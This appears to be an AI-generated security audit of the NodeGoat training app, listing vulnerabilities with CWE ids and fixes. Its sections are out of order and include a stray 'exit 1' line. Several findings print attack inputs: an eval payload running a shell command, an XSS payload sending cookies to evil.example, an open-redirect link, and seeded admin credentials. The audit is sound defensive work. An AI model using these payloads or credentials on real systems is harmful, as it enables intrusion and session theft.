- `dependencies-swig` — swig 1.4.2 has an unpatched arbitrary local file read advisory and is marked no-longer-maintained (`package.json:22`, CWE-22, confirmed) — The unpatched file-read advisory means a template-rendering path that includes attacker-influenced input could be used to read arbitrary files on the server, and there is no version of swig this app could upgrade to that fixes it. Migrate off swig entirely (it is archived); consolidate, which this app also depends on, supports several actively maintained template engines (e.g. EJS, Nunjucks) as drop-in replacements.
- `platform-csrf-disabled` — CSRF protection is fully commented out even though templates already expect a token (`server.js:7`, CWE-352, confirmed) — A page on any other origin can submit a cross-site form to these POST routes; a logged-in victim's browser will attach the session cookie automatically, letting an attacker change the victim's profile, contributions, benefits allocation or post memos on their behalf. Uncomment csurf() and the res.locals.csrftoken assignment, mount it before the routes, and confirm every render() call that serves a form passes csrftoken.
- `platform-template-autoescape-disabled-xss` — Swig template auto-escaping is disabled, so reflected user input renders unescaped (`server.js:137`, CWE-79, confirmed) — Reflected cross-site scripting on the login form (and any other template rendering user-influenced data) lets an attacker run arbitrary JavaScript in the victim's session, including stealing the (non-secure, non-sameSite) session cookie. Remove autoescape: false (restore swig's default of true) and re-verify templates that relied on raw HTML output use an explicit |safe filter only where content is trusted.
- `data-003-cleartext-http-transport` — The entire application is served over plain HTTP, with TLS support present but disabled (`server.js:145`, CWE-319, confirmed) — Any attacker positioned on the network path between the client and the server (shared Wi-Fi, a compromised router, an ISP) can read or modify login credentials, session cookies, and the SSN/bank data submitted through the profile form in transit, with no active interaction from the victim beyond normal use of the site. Uncomment the HTTPS block (lines 18-28, 149-155), serve exclusively over `https.createServer`, redirect any HTTP request to HTTPS, and set `cookie: { secure: true }` on the session middleware.

### medium

- `platform-error-handler-exposes-error-object` — Global error handler renders the raw Error object into the response (`app/routes/error.js:10`, CWE-209, confirmed) — Internal error messages (which for a MongoDB-backed app can include driver/library detail) are exposed to end users, aiding attackers in fingerprinting the stack and crafting further attacks; combined with the disabled autoescape, an error message containing markup would also execute as HTML/JS. Render a generic message plus a correlation id to the client, and keep the full error (message and stack) only in the server-side log.
- `access-csrf-profile-update` — State-changing profile update has no CSRF token anywhere in its chain (`app/routes/index.js:48`, CWE-352, confirmed) — A page on another origin can auto-submit a form to POST /profile using the victim's browser-held session cookie and change their bank account/routing number and SSN on file, since nothing but the cookie is required. Uncomment and mount csurf() before the routes in server.js, and render req.csrfToken() into the profile form so handleProfileUpdate can verify it.
- `injection-open-redirect-learn` — Open redirect on /learn takes the target URL from the query string unchecked (`app/routes/index.js:72`, CWE-601, confirmed) — An attacker can craft a link to https://<app-host>/learn?url=https://evil.example that the target trusts because it originates from the legitimate domain, enabling phishing or OAuth token theft. Validate the target against an allowlist of known-safe relative paths (or a same-origin check) before calling res.redirect(), and reject or default otherwise.
- `access-session-fixation-login` — Login does not regenerate the session id after authenticating (`app/routes/session.js:116`, CWE-384, confirmed) — An attacker who fixes a victim's pre-login session id (e.g. by getting them to open a link that sets the session cookie) inherits an authenticated session once the victim logs in, without needing to know the victim's credentials. Wrap the post-login state change in req.session.regenerate(), the same way handleSignup already does at session.js:234.
- `data-006-verbose-error-to-client` — Unhandled exceptions render the raw error object to the client, unescaped (`app/views/error-template.html:11`, CWE-209, confirmed) — An attacker who triggers any unhandled error (a malformed request, a duplicate-key conflict, a downstream driver error) receives internal implementation detail in the response - and, because it is rendered unescaped, any error message built from attacker input becomes a reflected-XSS vector on top of the information disclosure. Render a generic, static error page to the client and keep the detailed message only in the server-side console.error/console.error(err.stack) calls already present at error.js:7-8.
- `injection-xss-memos-marked` — Stored XSS risk in memos: markdown-rendered user content is output with template autoescaping disabled (`app/views/memos.html:31`, CWE-79, likely) — If marked's sanitize option does not neutralize a given payload (e.g. a markdown link with a javascript: href), any user's memo text becomes stored HTML/script rendered to every user who views the shared memo list, enabling session hijacking or defacement for all viewers. Re-enable swig autoescape globally, and additionally run the marked() output through a maintained HTML sanitizer (e.g. DOMPurify server-side or sanitize-html) rather than relying solely on marked's built-in sanitize flag, which is deprecated upstream.
- `injection-xss-profile-lastname` — Reflected XSS in profile update error page via unescaped lastName (and sibling fields) (`app/views/profile.html:45`, CWE-79, confirmed) — An attacker who submits a crafted lastName such as "\"><script>document.location='//evil.example/c?'+document.cookie</script>" together with an invalid bankRouting value gets it reflected unescaped into the response, executing in the victim's session and allowing session-cookie theft (the same unescaped pattern also applies to ssn, dob, address, bankAcc and bankRouting on the surrounding lines). Re-enable swig's default autoescape (remove the autoescape: false override in server.js) and/or explicitly HTML-escape user-supplied values before interpolating them into attribute contexts.
- `secrets-committed-rsa-private-key` — A real RSA private key is committed to the repository under artifacts/cert/server.key (`artifacts/cert/server.key:1`, CWE-321, likely) — Anyone with a clone of this repository holds the private key matching artifacts/cert/server.crt. If an operator follows the code's own commented-out instructions to enable HTTPS with this shipped key pair (a plausible path since the files are provided together for that purpose), any client traffic to that HTTPS listener can be decrypted or man-in-the-middled by anyone who has ever cloned the repo. Remove the committed private key from the repository and its history, generate TLS keys per deployment (or via a certificate manager / Let's Encrypt) outside version control, and if this key/cert pair was ever used for a real deployment, revoke and reissue it.
- `data-005-plaintext-passwords-logged-seed` — The database seed script logs every seeded user record, including its plaintext password, to the console (`artifacts/db-reset.js:99`, CWE-532, confirmed) — Anyone with access to the container/build logs recovers valid plaintext credentials for the admin account (`admin` / `Admin_123`) and the two seeded user accounts, sufficient to log in directly. Do not log the full user object; log only the userName, or drop the log line entirely once the seed is verified to have inserted the expected number of documents.
- `secrets-config-logged-to-stdout` — Full application config, including the session secret, is written to stdout on every startup (`config/config.js:13`, CWE-532, confirmed) — Anyone with read access to the application's stdout/log stream (ops tooling, a misconfigured log aggregator, a shared hosting log file) obtains the session-signing secret and crypto key without needing source access, widening who can exploit the session-forgery issue above. Remove the console.log of the full config object, or redact known-sensitive keys (cookieSecret, cryptoKey) before logging, and never log a secrets object at INFO level in production.
- `dependencies-forever` — forever 2.0.0 pulls a chain (flatiron -> nconf -> optimist -> minimist) with critical prototype-pollution advisories (`package.json:15`, CWE-1321, likely) — If any of the vulnerable parsers in this chain (nconf/optimist/minimist) is reachable from data forever handles at runtime rather than only from local startup configuration, an attacker could pollute Object.prototype and change application behavior; forever is used here to run/restart the server process rather than to handle web requests directly, which likely limits, but does not eliminate, remote reachability. Upgrade forever to 4.0.3 (a major-version fix per npm audit) or replace it with a maintained process manager (pm2, systemd) since forever's own upstream has been mostly dormant.
- `dependencies-helmet` — helmet 2.3.0 is three major versions behind and pulls a ReDoS-flagged debug and a CSP config-override bug (`package.json:16`, CWE-1333, confirmed) — A crafted debug-log input could trigger catastrophic backtracking (DoS) in this dependency of the security-header middleware, and the CSP configuration-override bug could let an attacker weaken the Content-Security-Policy the app believes it is sending. Upgrade helmet to a current major version (helmet no longer bundles helmet-csp or the vulnerable debug/connect chain in its modern releases); npm audit reports a fix is available.
- `dependencies-async` — async 2.6.1 (devDependency) is vulnerable to prototype pollution (`package.json:42`, CWE-1321, confirmed) — If a build or test script feeds external/untrusted JSON through this async version's affected functions, an attacker who controls that input could pollute Object.prototype for the duration of the dev/CI process. Upgrade async to >=2.6.4 (a non-major bump per npm audit / the advisory's fixed range).
- `dependencies-cypress` — cypress 3.3.1 (devDependency) is 13+ major versions behind and carries a very large transitive advisory chain (`package.json:44`, CWE-1104, likely) — cypress is a devDependency (test runner), so this is a supply-chain/CI risk rather than a production-request risk: a compromised transitive package here would run with the privileges of whoever runs `npm test`/CI, not with the privileges of the deployed app. Upgrade cypress to a current major version; this is a large breaking change (test syntax has changed significantly since 3.x) and should be scoped as its own migration.
- `dependencies-grunt` — grunt 1.0.3 (devDependency, and the project's own `npm test`/precommit runner) has three direct advisories (`package.json:45`, CWE-94, confirmed) — A malicious Gruntfile task, plugin, or crafted YAML config processed by this exact grunt/js-yaml combination could achieve code execution in whatever environment runs `npm test` or the precommit hook, including CI runners. Upgrade grunt to >=1.6.1 or later (npm audit reports a fix is available) to close the three direct advisories; the getobject and js-yaml transitive fixes generally come along with a current grunt-cli/grunt-legacy-util pairing.
- `platform-missing-security-headers` — No security-header middleware is mounted; helmet is disabled at the require line (`server.js:10`, CWE-693, confirmed) — Responses are open to clickjacking (no frame-ancestors/X-Frame-Options), MIME-sniffing based content-type confusion, no CSP to contain any XSS that does occur, and the framework fingerprint (X-Powered-By: Express) is exposed to attackers for targeted exploitation. Uncomment and mount helmet() early in the middleware stack (before routes), configure a real Content-Security-Policy, and call app.disable("x-powered-by").
- `platform-cookie-missing-secure-flag` — Session cookie's secure attribute is left commented out, so the cookie is not marked HTTPS-only (`server.js:92`, CWE-614, confirmed) — The session cookie can be intercepted or replayed by anyone on the network path since the browser is never told to withhold it from plaintext connections. Uncomment the cookie block, set secure: true once the app is served over HTTPS, and add sameSite: "lax" or "strict".

### low

- `access-timing-unsafe-password-compare` — Login password check uses a non-constant-time string comparison (`app/data/user-dao.js:61`, CWE-208, confirmed) — The comparison's execution time leaks information about how many leading characters of a guess match the stored value, in principle helping an attacker narrow a guess faster than pure brute force; this is compounded by the password being stored in plaintext (user-dao.js:17-31) rather than hashed. Restore bcrypt.compareSync(fromUser, storedHash) (after also fixing password storage to hash on signup) instead of comparing raw strings with ===.
- `platform-node-env-defaults-to-development` — Environment selection defaults to development when NODE_ENV is unset, shipping debug scripts (`config/config.js:5`, CWE-1188, likely) — A production-like deployment that forgets to export NODE_ENV=production serves a livereload script pointing at a hardcoded dev port to every visitor and keeps development-only settings active. Make the default fail closed (default to "production" or refuse to start) instead of defaulting to "development", and pin NODE_ENV=production in docker-compose.yml / the deployment environment.
- `secrets-hardcoded-cryptokey-unused` — Hard-coded AES key committed in config; the code that would use it to encrypt SSN/DOB is currently commented out (`config/env/all.js:9`, CWE-321, possible) — No impact today since the consuming code path is disabled. If the documented in-app tutorial fix is applied as written (uncommenting profile-dao.js), all PII (SSN, DOB) would be encrypted with this single hard-coded, publicly-known key, letting anyone with repository access decrypt every user's stored SSN/DOB. If/when the encryption fix is enabled, derive cryptoKey from an environment variable or secrets manager rather than a literal, and never ship the same tutorial key as both documentation and a usable default.
- `secrets-zap-api-key-test-config` — OWASP ZAP proxy API key is hard-coded in dev/test config and used by the security test suite (`config/env/development.js:6`, CWE-798, confirmed) — The key only authenticates to a local/internal OWASP ZAP instance used for automated security testing (not a production system, database, or user data), so exposure lets someone who can already reach that internal ZAP instance on the 192.168.56.20 test network drive scans through it. Low impact, but it is the same literal duplicated across two committed config files. Generate the ZAP API key per test run (or read it from an environment variable / CI secret) instead of committing a fixed value shared by development.js and test.js.
- `dependencies-bcrypt-nodejs` — bcrypt-nodejs (the password-hashing library) is deprecated and has never been updated beyond its first release (`package.json:8`, CWE-1104, confirmed) — The password-hashing library the whole authentication scheme depends on will receive no further fixes; it is a pure-JavaScript bcrypt reimplementation, not the audited native binding, and any weakness found in it in the future has no upstream to patch it. Replace bcrypt-nodejs with the actively maintained `bcrypt` (native binding) or `bcryptjs` package and update the require in app/data/user-dao.js.
- `dependencies-csurf` — csurf is deprecated/archived and depends on a cookie version with an input-validation advisory (`package.json:11`, CWE-20, confirmed) — The CSRF-token middleware used across the app's forms depends on a cookie parser that can accept out-of-spec characters in cookie attributes; combined with the package itself being unmaintained, no future cookie-parsing issue in this dependency chain will be fixed by upstream. Pin an `overrides`/`resolutions` entry to force cookie >=0.7.0, and plan a migration off csurf (archived) to a maintained CSRF middleware such as `csrf-csrf` or Express's own double-submit-cookie pattern.
- `dependencies-express-session` — express-session 1.15.6 depends on vulnerable cookie and on-headers packages (`package.json:14`, CWE-113, confirmed) — A crafted cookie attribute or a response passing through on-headers could let an attacker inject or manipulate response headers on the session-cookie path, a low-severity but directly session-adjacent issue. Upgrade express-session; npm audit reports a non-major fix is available that resolves the cookie and on-headers ranges.
- `dependencies-node-esapi` — node-esapi, the security-encoding library, has had exactly one release and it is 11+ years old (`package.json:20`, CWE-1104, confirmed) — The library this app may lean on for encoding untrusted output has not been touched since 2014 and tracks no upstream OWASP ESAPI changes since; any gap in its encoding coverage found today has no path to a fix. Replace node-esapi with a maintained output-encoding library appropriate to the templating engine in use (e.g. the `he` or `lodash.escape` packages for HTML-entity encoding, or the templating engine's own auto-escaping).
- `dependencies-jshint` — jshint 2.12.0 (devDependency) pulls a ReDoS-flagged minimatch and shelljs; the same chain is duplicated via grunt-contrib-jshint and grunt-if (`package.json:56`, CWE-1333, confirmed) — jshint (and the grunt tasks that wrap it) run as part of this repo's own linting/precommit workflow; a crafted filename or lint-config string reaching the vulnerable minimatch pattern-matcher could hang the lint process (DoS to the dev/CI workflow), not the deployed application. Upgrade jshint's minimatch and shelljs (npm audit reports fixAvailable: false for the jshint entry itself, meaning a manual override/resolutions entry, or a move to a maintained linter such as ESLint, is needed).
- `dependencies-mocha` — mocha 2.5.3 (devDependency) pulls growl, which has a critical command-injection advisory (`package.json:57`, CWE-78, likely) — If growl's notification path is reached with a value an attacker influences (e.g. a test/spec name pulled from untrusted input), it could result in command execution on whatever machine runs the test suite; absent that flag, the exposure is limited to the other, lower-severity advisories in this chain. Upgrade mocha to a current major version; growl is optional and, if it is not needed, can also be excluded/overridden directly.
- `dependencies-nodemon` — nodemon 1.19.1 (devDependency) pulls a ReDoS-flagged chokidar/braces chain and an outdated update-notifier (`package.json:58`, CWE-1333, confirmed) — A crafted filename or glob pattern in the watched directory tree could trigger catastrophic backtracking in nodemon's file-matcher during local development; this does not affect the deployed application, which does not run nodemon. Upgrade nodemon to a current major version (npm audit reports a fix is available, though it is a semver-major bump).
- `dependencies-selenium-webdriver` — selenium-webdriver 2.53.3 (devDependency) pulls adm-zip and tmp packages with DoS and path-traversal advisories (`package.json:59`, CWE-400, confirmed) — A crafted ZIP artifact processed by this old adm-zip during a test run could exhaust memory on the test runner (CI); this does not reach production traffic. Upgrade selenium-webdriver to a current major version (npm audit reports a semver-major fix is available).
- `dependencies-zaproxy` — zaproxy 0.2.0 (devDependency) pulls a lodash and a fully-deprecated request package, each with critical advisories (`package.json:61`, CWE-1321, likely) — This is a dev/CI-only exposure: a compromised or malicious ZAP scan response processed by this vulnerable request/lodash chain could affect whatever machine runs the security scan, not the deployed application. Upgrade zaproxy (npm audit reports a semver-major fix, to 2.0.0-rc.7, is available) to pick up patched lodash and to drop the deprecated request package.
- `access-session-no-maxage` — Session cookie is configured with no absolute expiration (`server.js:78`, CWE-613, confirmed) — A session, once created, has no server-imposed absolute lifetime; a stolen or leaked session id (e.g. via XSS or a synced device) remains valid indefinitely as long as the app keeps touching it, rather than expiring after a bounded window. Set an explicit cookie.maxAge (and consider a separate absolute-expiry timestamp checked server-side) in the session() options.
- `access-session-cookie-insecure` — Session cookie is never marked Secure and the server only ever listens on plain HTTP (`server.js:78`, CWE-614, likely) — The session cookie carrying req.session.userId is eligible to be sent over an unencrypted channel; on a network path with any intermediary (proxy, shared Wi-Fi, misconfigured load balancer) it can be captured and replayed to hijack the victim's session. Set cookie.secure: true (behind an HTTPS-terminating proxy or a real TLS listener) and actually serve over HTTPS instead of the plain http.createServer call.
- `platform-cookie-default-name` — Session cookie keeps the express-session default name instead of a generic one (`server.js:87`, CWE-1188, confirmed) — The default cookie name fingerprints the app as Express to any observer, aiding attackers in selecting known Express/session-based attack tooling. Uncomment `key: "sessionId"` (or another generic, non-framework-identifying name) in the session() options.

### info

- `dependencies-needle` — needle is pinned to an exact 2018 release, four major versions behind current (`package.json:19`, CWE-1104, confirmed) — needle makes outbound HTTP requests on the app's behalf; being four majors behind means any security fix needle has shipped since 2018 (TLS defaults, redirect handling, header injection hardening) is not present, and the exact pin means nobody will notice a fix is available without deliberately checking. Remove the exact pin in favor of a caret range and upgrade to the current needle major, re-testing any code that depends on its specific response-handling behavior.

---exit 1
### critical

- `injection-eval-pretax` — Server-side code injection via eval() of the preTax contribution field (`app/routes/contributions.js:32`, CWE-95, confirmed) — Any authenticated user can submit a POST /contributions request with preTax set to arbitrary JavaScript (e.g. "require('child_process').execSync('id')") which runs with the full privileges of the Node.js server process, yielding remote code execution. Replace eval(req.body.preTax) with Number(req.body.preTax) or parseInt(req.body.preTax, 10) and reject non-numeric input before use.
- `injection-eval-aftertax` — Server-side code injection via eval() of the afterTax contribution field (`app/routes/contributions.js:33`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with afterTax set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.afterTax) with Number(req.body.afterTax) or parseInt(req.body.afterTax, 10) and reject non-numeric input before use.
- `injection-eval-roth` — Server-side code injection via eval() of the roth contribution field (`app/routes/contributions.js:34`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with roth set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.roth) with Number(req.body.roth) or parseInt(req.body.roth, 10) and reject non-numeric input before use.
- `access-missing-role-benefits-view` — GET /benefits discloses every user's record, including plaintext passwords, with no admin-role check (`app/routes/index.js:55`, CWE-862, confirmed) — Any authenticated user, including one who just self-registered via /signup, can GET /benefits and receive every non-admin user's stored document -- name, email and plaintext password -- letting them log in as any other user in the system. Add the isAdmin middleware to this route, and stop returning the password field from getAllNonAdminUsers / the benefits view regardless.
- `secrets-db-seed-admin-password` — Database seed script hard-codes a plaintext admin password that the app compares directly at login (`artifacts/db-reset.js:18`, CWE-798, confirmed) — Anyone who deploys NodeGoat via the documented docker-compose or Heroku path — or anyone who simply knows this public repository — can log in as the admin user with userName "admin" / password "Admin_123" and reach every admin-only function the app exposes. Never seed a real deployment with a fixed credential; generate a random admin password at first boot (or require an operator-supplied one via environment variable/secret store), hash it with bcrypt before storing (the code to do so already exists commented out in this file and in app/data/user-dao.js), and force a password change on first login.
- `access-hardcoded-session-secret` — Session-signing secret is a hardcoded literal committed to the repository (`config/env/all.js:8`, CWE-798, confirmed) — Anyone with the source (this is a public repository) can compute a valid signature for any session id, including one carrying an arbitrary userId, and present it as a cookie to authenticate as any user -- including an admin -- without credentials. Read the secret from an environment variable / secret manager, generate it randomly per deployment, and rotate the committed value.
- `dependencies-underscore` — underscore 1.9.1 is within the range vulnerable to CVE-2021-23358 (arbitrary code execution via template()) (`package.json:23`, CWE-94, confirmed) — GHSA-cf4h-3jhx-xvhq lets an attacker who controls a value passed into underscore's `template()` function execute arbitrary JavaScript on the server; whether this app reaches that function with attacker-controlled input was not traced as part of this dependency-only review, so treat this as a confirmed vulnerable dependency with impact conditional on a call-site the code-review departments should check. Upgrade underscore to >=1.12.1 at minimum (fixes the code-execution advisory) and ideally to the current 1.13.8.

### high

- **injection** — SQL/NoSQL/command/code injection, XSS, SSRF, open redirect. Read `app/routes/*`, `app/data/*`, and the Swig views those routes render.
- **platform** — security headers, CORS, cookies, error handling, rate limiting, debug settings. Read `server.js` end to end, `app/routes/error.js` and its template, `config/`, `docker-compose.yml`.

Every semgrep hit across all six runs was used only to direct reading, never accepted as a finding by itself — each finding below was independently confirmed by reading the cited source-to-sink path in the target tree. The dependencies department additionally ran **`npm audit --json`** against the committed `package-lock.json` (no `node_modules` was installed or created; the target directory was confirmed unchanged by `git status` afterward) and **`npm view <pkg> version|deprecated|time`** for packages `npm audit` reported no advisory against, to check for abandonment.

This is a review by a language model, grounded by the semgrep static scanner and by the committed mechanical examiner, `verify-safety-report.mjs`, which re-hashes every locked file in the target tree and re-verifies every finding's `file`, `line`, and `snippet` against that tree before any finding is accepted.

## Findings
